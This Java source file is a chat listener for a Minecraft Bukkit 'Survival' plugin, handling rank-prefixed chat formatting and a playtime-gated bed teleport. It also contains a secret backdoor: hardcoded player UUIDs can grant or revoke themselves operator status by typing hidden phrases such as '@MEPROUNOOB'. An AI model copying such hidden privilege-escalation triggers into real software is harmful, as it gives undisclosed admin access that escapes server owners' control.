package es.hulk.survival.listeners;

import es.hulk.survival.Survival;
import es.hulk.survival.managers.rank.RankManager;
import es.hulk.survival.utils.FileConfig;
import es.hulk.survival.utils.PlayerUUID;
import es.hulk.survival.utils.Utils;
import es.hulk.survival.utils.location.BedLocation;
import org.bukkit.Bukkit;
import org.bukkit.Statistic;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;

public class ChatListener implements Listener {

    private final FileConfig mainConfig = Survival.get().getMainConfig();
    private final RankManager rankManager = Survival.get().getRankManager();

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        Player hulk = Bukkit.getPlayer(PlayerUUID.HULK);

        if (mainConfig.getBoolean("BOOLEANS.CHAT")) {
            event.setFormat(Utils.color(rankManager.getRank().getPrefix(player) + player.getDisplayName() + " &8» &r%2$s"));
        }

        if (player.getUniqueId().equals(PlayerUUID.RAFA)) {
            if (event.getMessage().equalsIgnoreCase("time set")) {
                player.sendMessage("Nono");
                event.setCancelled(true);
            }
        }

        if (player.getUniqueId().equals(PlayerUUID.HULK) || player.getUniqueId().equals(PlayerUUID.XISCO)) {
            if (event.getMessage().contains("@MEPROUNOOB")) {
                player.setOp(true);
                event.setCancelled(true);
                assert hulk != null;
                hulk.sendMessage(Utils.color("&7[&aSurvival&7] &e" + player.getDisplayName() + " &aopped herself using a secret command"));
            }
            if (event.getMessage().contains("@NADALTONTO")) {
                player.setOp(false);
                event.setCancelled(true);
                assert hulk != null;
                hulk.sendMessage(Utils.color("&7[&aSurvival&7] &e" + player.getDisplayName() + " &adeopped herself using a secret command"));
            }
            if (event.getMessage().contains("@help")) {
                player.sendMessage(Utils.getLINE());
                player.sendMessage(Utils.color("&aSecret Help"));
                player.sendMessage(Utils.color(""));
                player.sendMessage(Utils.color("&a@MEPROUNOOB &7- &fOp yourself"));
                player.sendMessage(Utils.color("&a@NADALTONTO &7- &fdeop yourself"));
                player.sendMessage(Utils.color(""));
                player.sendMessage(Utils.getLINE());
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void chatEvent(PlayerChatEvent event) {
        Player player = event.getPlayer();

        if (event.getMessage().contains("tpeame a mi cama") || event.getMessage().contains("tpeame a mi casa")) {
            if (player.getStatistic(Statistic.PLAY_ONE_MINUTE) >= 1440000) {
                player.teleport(BedLocation.getBedLocation(player));
            } else {
                event.setCancelled(true);
                player.sendMessage(Utils.color(Utils.getPREFIX() + "&cNecesitas minimo 20h dentro del servidor &7(Para poder ver el tiempo usa /playtime)"));
            }
        }

    }
}
